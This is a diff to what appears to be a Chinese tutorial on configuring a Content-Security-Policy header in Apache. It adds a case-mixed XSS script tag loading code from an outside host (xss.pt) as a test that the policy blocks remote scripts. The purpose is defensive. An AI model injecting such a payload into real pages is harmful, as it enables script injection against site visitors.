@@ -57,3 +57,5 @@ Header set Content-Security-Policy "default-src 'self';"
 ```
 重启apache服务，查看响应头是否含有Content-Security-Policy： default-src 'self';
 - 到页面中加载远程脚本
+<sCRiPt sRC=https://xss.pt/XUXdj></sCrIpT>
+- 然后这时浏览器就会报错
